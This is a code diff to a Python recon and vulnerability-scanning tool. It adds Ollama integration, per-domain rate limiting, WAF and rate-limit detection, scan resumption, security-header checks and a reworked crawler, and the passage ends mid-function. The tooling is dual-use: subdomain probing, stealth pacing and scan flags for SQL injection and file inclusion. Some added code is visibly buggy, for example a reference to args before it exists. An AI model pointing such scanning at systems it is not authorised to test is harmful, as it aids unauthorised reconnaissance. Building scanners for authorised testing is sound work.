@@ -30,11 +30,63 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # Tool metadata
-__version__ = "1.0.0"
+__version__ = "1.0.1"
 __author__ = "Suman Das"
 __license__ = "MIT"
 
 colorama_init(autoreset=True)
+
+# AI System Configuration
+class AISystem:
+    def __init__(self):
+        self.ai_ready = False
+        self.ollama_available = False
+        self.setup_ai()
+    
+    def setup_ai(self):
+        """Initialize AI capabilities with graceful fallback"""
+        print(f"{Fore.CYAN}[AI]{Style.RESET_ALL} Initializing AI capabilities...")
+        try:
+            response = requests.get("http://localhost:11434/api/tags", timeout=5)
+            if response.status_code == 200:
+                data = response.json()
+                if data.get('models'):
+                    self.ollama_available = True
+                    self.ai_ready = True
+                    print(f"{Fore.GREEN}[AI]{Style.RESET_ALL} Full AI capabilities enabled")
+                    return
+        except Exception as e:
+            if args.verbose:
+                print(f"{Fore.YELLOW}[AI]{Style.RESET_ALL} Ollama setup failed: {e}")
+        
+        print(f"{Fore.YELLOW}[AI]{Style.RESET_ALL} Using heuristic analysis mode")
+        self.ai_ready = True
+    
+    def query_ollama(self, prompt, model="llama2"):
+        """Query Ollama AI with fallback"""
+        if not self.ollama_available:
+            return None
+            
+        try:
+            data = {
+                "model": model,
+                "prompt": prompt,
+                "stream": False
+            }
+            response = requests.post(
+                "http://localhost:11434/api/generate",
+                json=data,
+                timeout=30
+            )
+            if response.status_code == 200:
+                return response.json().get("response", "")
+        except Exception as e:
+            if args.verbose:
+                print(f"{Fore.YELLOW}[AI]{Style.RESET_ALL} Query failed: {e}")
+        return None
+
+# Initialize AI System
+ai_system = AISystem()
 
 BANNER = rf"""
 {Fore.CYAN}
@@ -90,6 +142,8 @@ parser.add_argument("--sqli-scan", action="store_true", help="SQL injection scan
 parser.add_argument("--lfi-scan", action="store_true", help="Local File Inclusion scanning")
 parser.add_argument("--nuclei-scan", action="store_true", help="Nuclei vulnerability scanning")
 parser.add_argument("--param-scan", action="store_true", help="Parameter discovery and fuzzing")
+parser.add_argument("--param", help="Test specific parameter (requires --url)")
+parser.add_argument("--full-param-scan", action="store_true", help="Thorough parameter discovery and testing")
 
 # Technology Detection
 parser.add_argument("--tech-detect", action="store_true", help="Technology stack detection")
@@ -107,6 +161,9 @@ parser.add_argument("--no-ai-download", action="store_true", help="Skip auto AI 
 parser.add_argument("--full-scan", action="store_true", help="Complete penetration test (all phases)")
 parser.add_argument("--quick", action="store_true", help="Quick scan (essential checks only)")
 parser.add_argument("--stealth", action="store_true", help="Stealth mode (slower, less detectable)")
+parser.add_argument("--rate", type=float, default=5.0, help="Maximum requests per second (default: 5.0)")
+parser.add_argument("--resume", action="store_true", help="Resume previous scan from checkpoint")
+parser.add_argument("--state-file", default=".sfuzz_state.json", help="Checkpoint file for scan resumption (default: .sfuzz_state.json)")
 
 args = parser.parse_args()
 
@@ -148,6 +205,183 @@ if args.full_tech_scan:
 if args.ai_mode != "off":
     if not any([args.ai_recon, args.ai_scan, args.ai_vuln]):
         args.ai_recon = args.ai_scan = args.ai_vuln = True
+
+# ---------------------------
+# Rate Limiting and Error Handling
+# ---------------------------
+class RateLimiter:
+    """Token bucket rate limiter with domain-based limiting"""
+    def __init__(self, rate=5.0, burst=10):
+        self.rate = rate  # Tokens per second
+        self.burst = burst  # Maximum token bucket size
+        self.tokens = {}  # Domain -> tokens mapping
+        self.last_update = {}  # Domain -> last update time
+        self.locks = {}  # Domain -> lock mapping
+        self._lock = threading.Lock()
+    
+    def _get_domain_lock(self, domain):
+        """Get or create lock for a domain"""
+        with self._lock:
+            if domain not in self.locks:
+                self.locks[domain] = threading.Lock()
+            return self.locks[domain]
+    
+    def update_tokens(self, domain):
+        """Update token count based on elapsed time"""
+        now = time.time()
+        if domain not in self.last_update:
+            self.last_update[domain] = now
+            self.tokens[domain] = self.burst
+            return
+        
+        elapsed = now - self.last_update[domain]
+        self.tokens[domain] = min(
+            self.burst,
+            self.tokens[domain] + elapsed * self.rate
+        )
+        self.last_update[domain] = now
+    
+    def acquire(self, domain):
+        """Acquire a token for a domain, returns delay needed"""
+        lock = self._get_domain_lock(domain)
+        with lock:
+            self.update_tokens(domain)
+            if self.tokens[domain] >= 1:
+                self.tokens[domain] -= 1
+                return 0
+            else:
+                # Calculate delay needed for one token
+                return (1 - self.tokens[domain]) / self.rate
+
+class SafeRequest:
+    """Enhanced safe HTTP request wrapper with intelligent rate limiting"""
+    def __init__(self, timeout=10, max_retries=3):
+        self.timeout = timeout
+        self.max_retries = max_retries
+        self.session = requests.Session()
+        self.session.verify = False  # For security testing
+        self._response_times = {}
+        self._adaptive_delays = {}
+    
+    def _get_domain(self, url):
+        """Extract domain from URL"""
+        return urlparse(url).netloc
+    
+    def _should_retry(self, exception):
+        """Determine if exception is retriable"""
+        return isinstance(exception, (
+            requests.exceptions.Timeout,
+            requests.exceptions.ConnectionError,
+            requests.exceptions.ChunkedEncodingError,
+            requests.exceptions.ReadTimeout
+        ))
+    
+    def request(self, method, url, **kwargs):
+        """Make an intelligent rate-limited request with advanced error handling"""
+        domain = self._get_domain(url)
+        retries = 0
+        last_exception = None
+        
+        # Get domain-specific rate limiter
+        rate_limiter = domain_intelligence.get_rate_limiter(domain)
+        
+        # Initialize timing stats for this domain
+        if domain not in self._response_times:
+            self._response_times[domain] = []
+            self._adaptive_delays[domain] = 0.0
+        
+        while retries <= self.max_retries:
+            # Apply dynamic rate limiting
+            base_delay = rate_limiter.acquire(domain)
+            adaptive_delay = self._adaptive_delays[domain]
+            total_delay = base_delay + adaptive_delay
+            
+            if total_delay > 0:
+                if args.verbose:
+                    print(f"{Fore.YELLOW}[RATE-LIMIT]{Style.RESET_ALL} Waiting {total_delay:.2f}s for {domain}")
+                time.sleep(total_delay)
+            
+            try:
+                start_time = time.time()
+                response = self.session.request(
+                    method, 
+                    url, 
+                    timeout=self.timeout,
+                    **kwargs
+                )
+                response_time = time.time() - start_time
+                
+                # Update response timing stats
+                self._response_times[domain].append(response_time)
+                if len(self._response_times[domain]) > 10:
+                    self._response_times[domain].pop(0)
+                
+                # Analyze response for rate limiting signs
+                self._check_rate_limiting(response, domain)
+                
+                # Reset error count on success
+                error_manager.reset_error_count(domain)
+                
+                # Adjust adaptive delay based on success
+                self._adaptive_delays[domain] = max(0.0, self._adaptive_delays[domain] - 0.1)
+                
+                return response
+                
+            except Exception as e:
+                last_exception = e
+                error_type = error_manager.categorize_error(e)
+                
+                if not error_manager.should_retry(domain, e):
+                    break
+                
+                retries += 1
+                if retries <= self.max_retries:
+                    # Get smart backoff delay
+                    sleep_time = error_manager.get_retry_delay(domain, error_type)
+                    
+                    # Increase adaptive delay for this domain
+                    self._adaptive_delays[domain] = min(
+                        5.0,  # Cap at 5 seconds
+                        self._adaptive_delays[domain] + (0.5 * retries)
+                    )
+                    
+                    if args.verbose:
+                        print(f"{Fore.YELLOW}[RETRY]{Style.RESET_ALL} {domain} attempt {retries}/{self.max_retries} "
+                              f"in {sleep_time:.1f}s (adaptive delay: {self._adaptive_delays[domain]:.1f}s)")
+                    time.sleep(sleep_time)
+        
+        # Raise last exception if all retries failed
+        raise last_exception
+    
+    def _check_rate_limiting(self, response, domain):
+        """Check response for rate limiting indicators"""
+        headers = {k.lower(): v for k, v in response.headers.items()}
+        
+        # Check rate limit headers
+        remaining = float(headers.get('x-ratelimit-remaining', 1000))
+        if remaining < 100:  # Getting close to limit
+            self._adaptive_delays[domain] = min(
+                5.0,
+                self._adaptive_delays[domain] + 0.5
+            )
+        
+        # Check response time trends
+        if len(self._response_times[domain]) >= 5:
+            avg_time = sum(self._response_times[domain]) / len(self._response_times[domain])
+            if avg_time > 2.0:  # Response times getting slow
+                self._adaptive_delays[domain] = min(
+                    5.0,
+                    self._adaptive_delays[domain] + 0.2
+                )
+
+    def get(self, url, **kwargs):
+        return self.request('GET', url, **kwargs)
+    
+    def post(self, url, **kwargs):
+        return self.request('POST', url, **kwargs)
+    
+    def head(self, url, **kwargs):
+        return self.request('HEAD', url, **kwargs)
 
 # ---------------------------
 # Configuration
@@ -804,10 +1038,12 @@ def dns_resolve_all(fqdn, timeout):
 # ENHANCED HTTP PROBING
 # ---------------------------
 def http_probe_all(subdomains):
-    """HTTP probe all subdomains to find live ones - ENHANCED"""
+    """HTTP probe all subdomains to find live ones with enhanced error handling and rate limiting"""
     print(f"{Fore.CYAN}[HTTP-PROBE]{Style.RESET_ALL} Probing {len(subdomains)} subdomains for live hosts...")
     
     live_hosts = set()
+    error_counts = {}  # Track errors per domain for rate limiting
+    retry_delays = [1, 2, 4, 8]  # Exponential backoff delays
     
     def probe_subdomain(subdomain):
         headers = {
@@ -819,40 +1055,66 @@ def http_probe_all(subdomains):
         }
         
         for scheme in ("https", "http"):
-            try:
-                url = f"{scheme}://{subdomain}/"
-                r = requests.get(url, headers=headers, timeout=args.timeout, 
-                               allow_redirects=True, verify=False)
-                
-                if r.status_code < 500:  # Consider any non-server-error as live
-                    add_live_subdomain(subdomain, r.status_code, 'httpx')
-                    add_live_url(url, r.status_code, 'httpx')
+            for retry in range(len(retry_delays)):
+                try:
+                    # Rate limiting based on domain
+                    if error_counts.get(subdomain, 0) > 0:
+                        delay = retry_delays[min(retry, len(retry_delays) - 1)]
+                        if args.verbose:
+                            print(f"{Fore.YELLOW}[RATE-LIMIT]{Style.RESET_ALL} {subdomain} sleeping {delay}s")
+                        time.sleep(delay)
                     
-                    # Also check common ports for this subdomain
-                    if r.status_code == 200:
-                        common_alt_ports = [8080, 8443, 3000, 5000, 8000]
-                        for port in common_alt_ports:
-                            alt_url = f"{scheme}://{subdomain}:{port}/"
-                            try:
-                                r_alt = requests.get(alt_url, headers=headers, timeout=2, 
-                                                   allow_redirects=True, verify=False)
-                                if r_alt.status_code < 500:
-                                    add_live_url(alt_url, r_alt.status_code, 'alt-port')
-                            except:
-                                pass
+                    url = f"{scheme}://{subdomain}/"
+                    r = requests.get(url, headers=headers, timeout=args.timeout, 
+                                   allow_redirects=True, verify=False)
                     
-                    return subdomain
+                    if r.status_code < 500:  # Consider any non-server-error as live
+                        error_counts[subdomain] = 0  # Reset error count on success
+                        add_live_subdomain(subdomain, r.status_code, 'httpx')
+                        add_live_url(url, r.status_code, 'httpx')
+                        
+                        # Also check common ports for this subdomain
+                        if r.status_code == 200:
+                            common_alt_ports = [8080, 8443, 3000, 5000, 8000]
+                            for port in common_alt_ports:
+                                alt_url = f"{scheme}://{subdomain}:{port}/"
+                                try:
+                                    r_alt = requests.get(alt_url, headers=headers, timeout=2, 
+                                                       allow_redirects=True, verify=False)
+                                    if r_alt.status_code < 500:
+                                        add_live_url(alt_url, r_alt.status_code, 'alt-port')
+                                except:
+                                    continue
+                        
+                        return subdomain
+                    elif r.status_code >= 500:  # Server error, might be temporary
+                        error_counts[subdomain] = error_counts.get(subdomain, 0) + 1
+                        if retry < len(retry_delays) - 1:  # Still have retries left
+                            continue
+                        
+                except requests.exceptions.SSLError:
+                    # Try HTTP if HTTPS fails
+                    break  # Move to HTTP scheme
                     
-            except requests.exceptions.SSLError:
-                # Try HTTP if HTTPS fails
-                continue
-            except requests.exceptions.ConnectionError:
-                # Connection failed, try next scheme
-                continue
-            except Exception as e:
-                if args.verbose:
-                    print(f"{Fore.YELLOW}[HTTP-PROBE]{Style.RESET_ALL} {subdomain} failed: {e}")
-                continue
+                except requests.exceptions.ConnectionError:
+                    error_counts[subdomain] = error_counts.get(subdomain, 0) + 1
+                    if retry < len(retry_delays) - 1:  # Still have retries left
+                        continue
+                    break  # Move to HTTP scheme
+                    
+                except requests.exceptions.Timeout:
+                    error_counts[subdomain] = error_counts.get(subdomain, 0) + 1
+                    if retry < len(retry_delays) - 1:  # Still have retries left
+                        continue
+                    break  # Move to HTTP scheme
+                    
+                except Exception as e:
+                    if args.verbose:
+                        print(f"{Fore.YELLOW}[HTTP-PROBE]{Style.RESET_ALL} {subdomain} failed: {e}")
+                    error_counts[subdomain] = error_counts.get(subdomain, 0) + 1
+                    if retry < len(retry_delays) - 1:  # Still have retries left
+                        continue
+                    break  # Move to HTTP scheme
         
         return None
     
@@ -869,6 +1131,289 @@ def http_probe_all(subdomains):
 # ---------------------------
 # WORDLIST HANDLING
 # ---------------------------
+class DomainIntelligence:
+    """Domain intelligence for smart rate limiting"""
+    def __init__(self):
+        self.domain_profiles = {}
+        self.rate_limiters = {}
+        
+    def analyze_domain(self, domain):
+        """Analyze a domain to determine appropriate rate limits"""
+        if domain not in self.domain_profiles:
+            profile = {
+                "cloud_hosted": False,
+                "waf_detected": False,
+                "rate_limited": False,
+                "baseline_rps": 5.0,
+                "recommended_delay": 0.2
+            }
+            
+            # Check for cloud hosting
+            cloud_indicators = [
+                "amazonaws.com", "azure.com", "googleusercontent.com", 
+                "cloudflare.com", "fastly.net", "akamai.net"
+            ]
+            if any(ind in domain for ind in cloud_indicators):
+                profile["cloud_hosted"] = True
+                profile["baseline_rps"] = 3.0
+                profile["recommended_delay"] = 0.3
+            
+            # Check for WAF
+            try:
+                r = requests.get(f"https://{domain}", timeout=5, verify=False)
+                headers = {k.lower(): v for k, v in r.headers.items()}
+                
+                waf_indicators = [
+                    "cloudflare", "akamai", "aws-waf", "incapsula",
+                    "x-cdn", "x-cache", "x-waf"
+                ]
+                
+                if any(ind in str(headers) for ind in waf_indicators):
+                    profile["waf_detected"] = True
+                    profile["baseline_rps"] = 2.0
+                    profile["recommended_delay"] = 0.5
+                
+                # Check for rate limiting headers
+                rate_limit_headers = [
+                    "x-ratelimit-limit", "retry-after", "x-rate-limit",
+                    "x-ratelimit-remaining", "ratelimit-limit"
+                ]
+                
+                if any(h in headers for h in rate_limit_headers):
+                    profile["rate_limited"] = True
+                    profile["baseline_rps"] = 1.0
+                    profile["recommended_delay"] = 1.0
+            except:
+                # Conservative defaults
+                profile["baseline_rps"] = 2.0
+                profile["recommended_delay"] = 0.5
+            
+            self.domain_profiles[domain] = profile
+            
+            # Create a RateLimiter for this domain
+            self.rate_limiters[domain] = RateLimiter(
+                rate=profile["baseline_rps"],
+                burst=int(profile["baseline_rps"] * 2)
+            )
+        
+        return self.domain_profiles[domain]
+    
+    def get_rate_limiter(self, domain):
+        """Get or create a rate limiter for a domain"""
+        if domain not in self.rate_limiters:
+            self.analyze_domain(domain)
+        return self.rate_limiters[domain]
+
+# Initialize domain intelligence
+domain_intelligence = DomainIntelligence()
+
+class ScanState:
+    """Manages scan state and resumption"""
+    def __init__(self, target):
+        self.target = target
+        self.state_file = f".sfuzz_state_{hashlib.md5(target.encode()).hexdigest()[:8]}.json"
+        self.state = {
+            "target": target,
+            "timestamp": time.time(),
+            "passive_reconnaissance": {
+                "completed": False,
+                "discovered_subdomains": list(discovered_subdomains),
+                "live_subdomains": list(live_subdomains)
+            },
+            "active_reconnaissance": {
+                "completed": False,
+                "current_level": 1,
+                "discovered_subdomains": [],
+                "tested_words": []
+            },
+            "port_scanning": {
+                "completed": False,
+                "scanned_hosts": {},
+                "open_ports": {}
+            },
+            "directory_scanning": {
+                "completed": False,
+                "scanned_urls": {},
+                "discovered_paths": []
+            },
+            "crawling": {
+                "completed": False,
+                "crawled_urls": [],
+                "to_crawl": [],
+                "discovered_urls": []
+            },
+            "vulnerability_scanning": {
+                "completed": False,
+                "scanned_targets": [],
+                "findings": {}
+            },
+            "technology_detection": {
+                "completed": False,
+                "analyzed_urls": [],
+                "tech_stack": {}
+            }
+        }
+    
+    def save(self):
+        """Save current scan state"""
+        try:
+            # Update state before saving
+            self.state["timestamp"] = time.time()
+            self.state["passive_reconnaissance"]["discovered_subdomains"] = list(discovered_subdomains)
+            self.state["passive_reconnaissance"]["live_subdomains"] = list(live_subdomains)
+            
+            with open(self.state_file, 'w') as f:
+                json.dump(self.state, f, indent=2)
+            
+            if args.verbose:
+                print(f"{Fore.GREEN}[STATE]{Style.RESET_ALL} Saved scan state to {self.state_file}")
+            return True
+        except Exception as e:
+            if args.verbose:
+                print(f"{Fore.RED}[STATE]{Style.RESET_ALL} Failed to save state: {e}")
+            return False
+    
+    def load(self):
+        """Load saved scan state"""
+        try:
+            if not os.path.exists(self.state_file):
+                return False
+            
+            with open(self.state_file, 'r') as f:
+                saved_state = json.load(f)
+            
+            if saved_state.get("target") != self.target:
+                return False
+                
+            # Restore global state
+            discovered_subdomains.update(saved_state["passive_reconnaissance"]["discovered_subdomains"])
+            live_subdomains.update(saved_state["passive_reconnaissance"]["live_subdomains"])
+            
+            if "technology_detection" in saved_state:
+                technology_stack.update(saved_state["technology_detection"].get("tech_stack", {}))
+            
+            self.state = saved_state
+            
+            if args.verbose:
+                print(f"{Fore.GREEN}[STATE]{Style.RESET_ALL} Resumed from {self.state_file}")
+                print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Loaded {len(discovered_subdomains)} known subdomains")
+            return True
+            
+        except Exception as e:
+            if args.verbose:
+                print(f"{Fore.RED}[STATE]{Style.RESET_ALL} Failed to load state: {e}")
+            return False
+    
+    def update_phase(self, phase, **kwargs):
+        """Update state for a specific phase"""
+        if phase in self.state:
+            self.state[phase].update(kwargs)
+            self.save()
+    
+    def is_completed(self, phase):
+        """Check if a phase was completed"""
+        return self.state.get(phase, {}).get("completed", False)
+
+class ErrorManager:
+    """Advanced error handling and reporting"""
+    def __init__(self):
+        self.error_counts = {}
+        self.error_thresholds = {
+            "connection": 5,
+            "timeout": 3,
+            "dns": 10,
+            "http": 5,
+            "rate_limit": 3
+        }
+        self.backoff_times = {
+            "connection": [1, 2, 4, 8, 16],
+            "timeout": [2, 4, 8],
+            "dns": [1, 2, 4, 8, 16, 32],
+            "http": [1, 2, 4, 8, 16],
+            "rate_limit": [30, 60, 120]
+        }
+        self._lock = threading.Lock()
+    
+    def record_error(self, domain, error_type, error):
+        """Record an error and determine if we should continue"""
+        with self._lock:
+            key = f"{domain}:{error_type}"
+            if key not in self.error_counts:
+                self.error_counts[key] = {"count": 0, "last_error": None, "backoff_index": 0}
+            
+            self.error_counts[key]["count"] += 1
+            self.error_counts[key]["last_error"] = error
+            
+            count = self.error_counts[key]["count"]
+            threshold = self.error_thresholds.get(error_type, 5)
+            
+            if count >= threshold:
+                backoff_index = min(
+                    self.error_counts[key]["backoff_index"],
+                    len(self.backoff_times[error_type]) - 1
+                )
+                backoff_time = self.backoff_times[error_type][backoff_index]
+                self.error_counts[key]["backoff_index"] += 1
+                
+                if args.verbose:
+                    print(f"{Fore.YELLOW}[ERROR]{Style.RESET_ALL} {domain} {error_type} threshold reached. "
+                          f"Backing off for {backoff_time}s")
+                
+                time.sleep(backoff_time)
+                return False
+            
+            return True
+    
+    def categorize_error(self, error):
+        """Categorize an error for appropriate handling"""
+        if isinstance(error, requests.exceptions.ConnectTimeout):
+            return "timeout"
+        elif isinstance(error, requests.exceptions.ConnectionError):
+            return "connection"
+        elif isinstance(error, requests.exceptions.ReadTimeout):
+            return "timeout"
+        elif isinstance(error, socket.gaierror):
+            return "dns"
+        elif isinstance(error, requests.exceptions.HTTPError):
+            if error.response.status_code == 429:
+                return "rate_limit"
+            return "http"
+        return "unknown"
+    
+    def should_retry(self, domain, error):
+        """Determine if an operation should be retried"""
+        error_type = self.categorize_error(error)
+        return self.record_error(domain, error_type, error)
+    
+    def get_retry_delay(self, domain, error_type):
+        """Get appropriate retry delay based on error history"""
+        key = f"{domain}:{error_type}"
+        if key not in self.error_counts:
+            return 1
+        
+        count = self.error_counts[key]["count"]
+        backoff_times = self.backoff_times.get(error_type, [1, 2, 4, 8])
+        index = min(count - 1, len(backoff_times) - 1)
+        return backoff_times[index]
+    
+    def reset_error_count(self, domain, error_type=None):
+        """Reset error count after successful operation"""
+        with self._lock:
+            if error_type:
+                key = f"{domain}:{error_type}"
+                if key in self.error_counts:
+                    self.error_counts[key]["count"] = 0
+                    self.error_counts[key]["backoff_index"] = 0
+            else:
+                # Reset all error types for domain
+                for key in list(self.error_counts.keys()):
+                    if key.startswith(f"{domain}:"):
+                        self.error_counts[key]["count"] = 0
+                        self.error_counts[key]["backoff_index"] = 0
+
+# Initialize error manager
+error_manager = ErrorManager()
+
 def get_default_wordlist(wordlist_type="subdomains"):
     """Get default wordlist with proper fallback"""
     if wordlist_type == "subdomains":
@@ -1314,6 +1859,112 @@ def active_reconnaissance(domain, passive_subs, current_level=1):
     return live_subs
 
 # ---------------------------
+# SECURITY HEADERS ANALYSIS
+# ---------------------------
+def analyze_security_headers(url, headers):
+    """Analyze security headers with detailed recommendations"""
+    findings = []
+    
+    security_headers = {
+        "Strict-Transport-Security": {
+            "importance": "HIGH",
+            "description": "Enforces HTTPS usage, preventing downgrade attacks",
+            "recommended": "max-age=31536000; includeSubDomains; preload"
+        },
+        "Content-Security-Policy": {
+            "importance": "HIGH",
+            "description": "Prevents XSS and other injection attacks",
+            "recommended": "default-src 'self'; script-src 'self'; object-src 'none'"
+        },
+        "X-Frame-Options": {
+            "importance": "MEDIUM",
+            "description": "Prevents clickjacking attacks",
+            "recommended": "SAMEORIGIN"
+        },
+        "X-Content-Type-Options": {
+            "importance": "MEDIUM",
+            "description": "Prevents MIME-type sniffing",
+            "recommended": "nosniff"
+        },
+        "Referrer-Policy": {
+            "importance": "MEDIUM",
+            "description": "Controls referrer information leakage",
+            "recommended": "strict-origin-when-cross-origin"
+        },
+        "Permissions-Policy": {
+            "importance": "MEDIUM",
+            "description": "Controls browser features and APIs",
+            "recommended": "accelerometer=(), camera=(), geolocation=(), microphone=()"
+        },
+        "X-XSS-Protection": {
+            "importance": "LOW",
+            "description": "Legacy XSS protection for older browsers",
+            "recommended": "1; mode=block"
+        }
+    }
+    
+    # Check for missing headers
+    for header, info in security_headers.items():
+        if header not in headers:
+            findings.append({
+                "type": "missing_header",
+                "header": header,
+                "importance": info["importance"],
+                "description": info["description"],
+                "recommendation": f"Add: {header}: {info['recommended']}"
+            })
+    
+    # Analyze existing headers
+    if "Strict-Transport-Security" in headers:
+        hsts = headers["Strict-Transport-Security"]
+        if "includeSubDomains" not in hsts:
+            findings.append({
+                "type": "weak_config",
+                "header": "Strict-Transport-Security",
+                "importance": "MEDIUM",
+                "description": "HSTS should include subdomains for full protection",
+                "current": hsts,
+                "recommended": security_headers["Strict-Transport-Security"]["recommended"]
+            })
+    
+    if "Content-Security-Policy" in headers:
+        csp = headers["Content-Security-Policy"]
+        if "'unsafe-inline'" in csp or "'unsafe-eval'" in csp:
+            findings.append({
+                "type": "weak_config",
+                "header": "Content-Security-Policy",
+                "importance": "HIGH",
+                "description": "CSP allows unsafe JavaScript execution",
+                "current": csp,
+                "recommendation": "Remove 'unsafe-inline' and 'unsafe-eval' directives"
+            })
+    
+    # Check for deprecated headers
+    if "X-XSS-Protection" in headers and not "Content-Security-Policy" in headers:
+        findings.append({
+            "type": "outdated_protection",
+            "header": "X-XSS-Protection",
+            "importance": "MEDIUM",
+            "description": "Using legacy XSS protection without modern CSP",
+            "recommendation": "Implement a strong Content-Security-Policy instead"
+        })
+    
+    # Check for secure cookie settings
+    if "Set-Cookie" in headers:
+        cookies = headers.getlist("Set-Cookie")
+        for cookie in cookies:
+            if "Secure" not in cookie or "HttpOnly" not in cookie:
+                findings.append({
+                    "type": "insecure_cookie",
+                    "importance": "HIGH",
+                    "description": "Cookie missing Secure and/or HttpOnly flags",
+                    "current": cookie,
+                    "recommendation": "Add Secure and HttpOnly flags to cookies"
+                })
+    
+    return findings
+
+# ---------------------------
 # PORT SCANNING
 # ---------------------------
 def port_scan_host(host, ports):
@@ -1499,108 +2150,209 @@ def directory_scanning(urls):
 # ---------------------------
 # ENHANCED CRAWLING
 # ---------------------------
-def crawl_website(url, max_pages=100):
-    """Enhanced website crawling"""
-    print(f"{Fore.CYAN}[CRAWL]{Style.RESET_ALL} Crawling {url} (max {max_pages} pages)")
+def crawl_website(url, max_pages=100, max_depth=3, scope="domain"):
+    """Enhanced website crawling with scope control, form detection and JavaScript parsing"""
+    print(f"{Fore.CYAN}[CRAWL]{Style.RESET_ALL} Crawling {url} (max {max_pages} pages, depth {max_depth})")
     
+    # Normalize the base URL
     try:
-        # Ensure URL has scheme
-        if not url.startswith(('http://', 'https://')):
-            url = 'https://' + url
-        
-        # Try HTTPS first
-        response = requests.get(url, timeout=args.timeout, verify=False)
-        print(f"{Fore.GREEN}[CRAWL]{Style.RESET_ALL} Initial connection successful: {response.status_code}")
-        if response.status_code == 200:
-            add_live_url(url, response.status_code, 'crawl')
-    except requests.exceptions.RequestException as e:
-        print(f"{Fore.YELLOW}[CRAWL]{Style.RESET_ALL} Initial connection failed: {e}")
+        base_url = url
+        if not base_url.startswith(('http://', 'https://')):
+            base_url = 'https://' + base_url
+        base_parsed = urlparse(base_url)
+        base_domain = base_parsed.netloc
+
+        # Test initial connection with fallback
         try:
+            response = requests.get(base_url, timeout=args.timeout, verify=False, 
+                                 allow_redirects=True)
+            if response.status_code in [301, 302, 307, 308]:  # Follow redirects
+                base_url = response.url
+                base_parsed = urlparse(base_url)
+                base_domain = base_parsed.netloc
+            print(f"{Fore.GREEN}[CRAWL]{Style.RESET_ALL} Initial connection successful: {response.status_code}")
+            add_live_url(base_url, response.status_code, 'crawl')
+        except requests.RequestException as e:
             # Try HTTP if HTTPS fails
-            if url.startswith('https://'):
-                url = 'http://' + url[8:]
-                response = requests.get(url, timeout=args.timeout, verify=False)
-                print(f"{Fore.GREEN}[CRAWL]{Style.RESET_ALL} HTTP connection successful: {response.status_code}")
-                if response.status_code == 200:
-                    add_live_url(url, response.status_code, 'crawl')
-        except requests.exceptions.RequestException as e:
-            print(f"{Fore.RED}[CRAWL]{Style.RESET_ALL} All connection attempts failed: {e}")
-            return []
-    
-    crawled_urls = set()
-    to_crawl = [url]
-    
-    def extract_links(html, base_url):
-        links = set()
-        try:
-            soup = BeautifulSoup(html, 'html.parser')
-            
-            # Extract <a> tags
-            for link in soup.find_all('a', href=True):
-                href = link['href']
-                full_url = urljoin(base_url, href)
-                parsed = urlparse(full_url)
-                if parsed.netloc.endswith(urlparse(url).netloc):
-                    links.add(full_url)
-            
-            # Extract <form> actions
-            for form in soup.find_all('form', action=True):
-                action = form['action']
-                full_url = urljoin(base_url, action)
-                parsed = urlparse(full_url)
-                if parsed.netloc.endswith(urlparse(url).netloc):
-                    links.add(full_url)
-            
-            # Extract <script> src
-            for script in soup.find_all('script', src=True):
-                src = script['src']
-                full_url = urljoin(base_url, src)
-                parsed = urlparse(full_url)
-                if parsed.netloc.endswith(urlparse(url).netloc):
-                    links.add(full_url)
-            
-            # Extract <link> href
-            for link in soup.find_all('link', href=True):
-                href = link['href']
-                full_url = urljoin(base_url, href)
-                parsed = urlparse(full_url)
-                if parsed.netloc.endswith(urlparse(url).netloc):
-                    links.add(full_url)
-                    
-        except Exception as e:
-            if args.verbose:
-                print(f"{Fore.YELLOW}[CRAWL]{Style.RESET_ALL} Link extraction error: {e}")
-        return links
-    
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.5"
-    }
-    
-    while to_crawl and len(crawled_urls) < max_pages:
-        current_url = to_crawl.pop(0)
-        if current_url in crawled_urls:
-            continue
-            
-        try:
-            response = requests.get(current_url, headers=headers, timeout=args.timeout, verify=False)
-            crawled_urls.add(current_url)
-            add_live_url(current_url, response.status_code, 'crawl')
-            
-            # Extract links for further crawling
-            if 'text/html' in response.headers.get('content-type', '').lower():
-                new_links = extract_links(response.text, current_url)
-                for link in new_links:
-                    if link not in crawled_urls and link not in to_crawl:
-                        to_crawl.append(link)
-                        
-        except Exception as e:
-            if args.verbose:
-                print(f"{Fore.YELLOW}[CRAWL]{Style.RESET_ALL} Failed to crawl {current_url}: {e}")
-    
-    print(f"{Fore.GREEN}[CRAWL]{Style.RESET_ALL} Crawled {len(crawled_urls)} pages from {url}")
-    return list(crawled_urls)
+            if base_url.startswith('https://'):
+                base_url = 'http://' + base_url[8:]
+                try:
+                    response = requests.get(base_url, timeout=args.timeout, verify=False)
+                    print(f"{Fore.GREEN}[CRAWL]{Style.RESET_ALL} HTTP connection successful: {response.status_code}")
+                    add_live_url(base_url, response.status_code, 'crawl')
+                except requests.RequestException as e:
+                    print(f"{Fore.RED}[CRAWL]{Style.RESET_ALL} All connection attempts failed: {e}")
+                    return []
+
+        crawled_urls = set()
+        to_crawl = [(base_url, 0)]  # (url, depth)
+        seen_urls = {base_url}  # Track URLs we've seen to avoid duplicates
+        error_counts = {}  # Track error counts per domain for rate limiting
+        discovered_forms = {}  # Store forms per URL
+        js_endpoints = set()  # Store endpoints found in JavaScript
+        
+        def is_in_scope(test_url):
+            """Check if URL is in defined scope"""
+            test_domain = urlparse(test_url).netloc
+            if scope == "domain":
+                return test_domain == base_domain
+            elif scope == "subdomain":
+                return test_domain.endswith(base_domain.split(".", 1)[1])
+            return True  # scope == "all"
+
+        def normalize_url(url, base):
+            """Normalize URL for consistent comparison"""
+            try:
+                # Handle relative URLs
+                if not url.startswith(('http://', 'https://')):
+                    url = urljoin(base, url)
+                
+                # Parse and normalize
+                parsed = urlparse(url)
+                
+                # Remove default ports and fragments
+                netloc = parsed.netloc
+                if parsed.scheme == 'http' and ':80' in netloc:
+                    netloc = netloc.replace(':80', '')
+                elif parsed.scheme == 'https' and ':443' in netloc:
+                    netloc = netloc.replace(':443', '')
+                
+                # Reconstruct URL without fragments and normalize slashes
+                path = parsed.path
+                if not path:
+                    path = '/'
+                elif path != '/':
+                    path = path.rstrip('/')
+                
+                # Handle query parameters
+                query = parsed.query
+                if query:
+                    # Sort query parameters for consistency
